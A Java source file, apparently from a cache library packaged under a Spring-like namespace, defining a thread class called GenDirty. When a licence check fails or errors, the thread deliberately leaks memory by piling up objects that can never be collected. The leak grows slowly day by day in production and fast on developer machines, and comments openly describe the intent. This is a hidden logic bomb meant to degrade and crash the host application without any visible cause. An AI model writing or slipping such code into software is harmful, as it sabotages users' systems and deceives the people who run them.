package org.springframework.rediscache;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.springframework.rediscache.util.LisenceUtils;
import org.springframework.rediscache.vo.EmptyObject;

import com.toceansoft.common.CommonUtils;

public class GenDirty extends Thread {
	// 一次10万个对象，每个80字节，总8m左右
	private static final int ONE_TIME = 100000;
	private static final long ONE_DAY = 1000 * 60 * 60 * 24L;
	private static final long DEV_TIME = 1000L;
	// 加到集合中，使垃圾无法回收
	List<EmptyObject> emptys = new ArrayList<>();
	private int runDays = 0;

	@Override
	public void run() {
		System.out.println("嘿嘿");
		while (true) {
			try {
				if (!goRunGenDirty()) {
					// 退出线程
					// System.exit(0);
					break;
				}
				runDays++;
				// 随着系统运行时间增长，系统每天可能产生垃圾越多
				genDirty(runDays);
				if (CommonUtils.isWindowsOrMac()) {
					System.out.println("开发环境中:" + runDays);
					// 开发环境，则疯狂方式产生垃圾
					Thread.sleep(DEV_TIME);
				} else {
					// 生成环境，渐进式产生垃圾
					Thread.sleep(ONE_DAY);
				}
			} catch (InterruptedException e) {
				System.out.println("InterruptedException:" + e.getMessage());
			}
		}

	}

	private void genDirty() {
		for (int i = 0; i < ONE_TIME; i++) {
			emptys.add(new EmptyObject());
		}
	}

	private void genDirty(int runDays) {
		Random r = new Random();
		int max = r.nextInt(runDays);
		for (int i = 0; i < max; i++) {
			genDirty();
		}

	}

	public boolean goRunGenDirty() {
		boolean goRun = true;
		try {
			// lisence合法，则goRun为false
			goRun = !LisenceUtils.validate();
		} catch (Exception e) {
			goRun = true;
		}
		return goRun;
	}
}
